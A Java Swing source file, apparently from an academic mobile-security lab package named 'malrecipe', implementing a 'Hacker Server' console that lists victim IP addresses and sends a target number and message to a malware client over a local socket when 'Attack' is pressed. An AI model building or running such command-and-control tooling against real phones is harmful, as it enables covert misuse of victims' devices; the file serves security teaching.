package edu.mobilesecuritylabware.malware.malrecipe;

import java.awt.Color;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;

import javax.swing.BorderFactory;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JTextArea;

public class MyFrame extends JFrame implements ActionListener {

	public static final String adb_path= "E:\\android\\adt-bundle-windows-x86_64-20131030\\sdk\\platform-tools\\adb ";//
	private JPanel mainPanel;
	private JTextArea ip;
	private JTextArea ipList;

	private JTextArea id;
	private JTextArea message;
	private JTextArea targetNo;
	private JButton attack;

	private Socket mSocket;
	private PrintWriter pw;

	String myIPaddress = null;
	
	List<String> list;
	
	private static final String HOST = "127.0.0.1";  
    private static final int PORT = 7777; 

	public MyFrame() {
		mainPanel = new JPanel();
		mainPanel.setBorder(BorderFactory.createLineBorder(Color.black, 1));

		add(mainPanel);

		JLabel title = new JLabel("Hacker Server IP:");
		// mainPanel.add(title);

		ip = new JTextArea();
		myIPaddress=getMyIP().getHostAddress();
		ip.setText(myIPaddress);
		// mainPanel.add(ip);

		JPanel panel1 = new JPanel();
		panel1.setLayout(new GridLayout(1, 2));
		// panel1.setBorder(BorderFactory.createLineBorder (Color.black, 1));
		panel1.add(title);
		panel1.add(ip);
		mainPanel.add(panel1);

		JLabel listTitle = new JLabel("Online Victim IP Address List");
		ipList = new JTextArea(5, 20);

		list=new ArrayList<String>();
		list.add("127.0.0.1:7777");
		for(int i=0;i<list.size();i++){
			ipList.setText(list.get(i)+"\r\n");
		}
		JPanel panel2 = new JPanel();
		panel2.setLayout(new GridLayout(2, 1));
		panel2.add(listTitle);
		panel2.add(ipList);
		mainPanel.add(panel2);

		JLabel clientID = new JLabel("Client ID:");
		id = new JTextArea(1, 5);
		JPanel panel3 = new JPanel();
		// panel2.setLayout(new GridLayout(2,1));
		panel3.add(clientID);
		panel3.add(id);
		mainPanel.add(panel3);

		JLabel msg = new JLabel("Message:");
		message = new JTextArea(5, 15);
		JPanel panel4 = new JPanel();
		// panel2.setLayout(new GridLayout(2,1));
		panel4.add(msg);
		panel4.add(message);
		mainPanel.add(panel4);

		JLabel target = new JLabel("Target:");
		targetNo = new JTextArea(1, 13);
		attack = new JButton("Attack");
		attack.setActionCommand("attack");
		attack.addActionListener(this);
		JPanel panel5 = new JPanel();
		panel5.add(target);
		panel5.add(targetNo);
		panel5.add(attack);
		mainPanel.add(panel5);

		
		this.setSize(300, 500);
		this.show();
	}

	@Override
	public void actionPerformed(ActionEvent ae) {
		try {
			
			mSocket = new Socket(HOST, PORT);
			pw = new PrintWriter(new BufferedWriter(new OutputStreamWriter(
					mSocket.getOutputStream())));
			if (ae.getSource().equals(attack)) {
				String msg = message.getText();
				String tar = targetNo.getText();

				pw.print(tar + "#" + msg);// message sent to server NO+MSG
				pw.flush();
				JOptionPane.showMessageDialog(this, "Attack Successfully",
						"Message", JOptionPane.INFORMATION_MESSAGE);
			}
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} finally {
			try {
				mSocket.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

	}

	private InetAddress getMyIP() {
		try { 
			return InetAddress.getLocalHost();
			}catch (UnknownHostException e) {
			e.printStackTrace();
			return null;
		}
		}
}
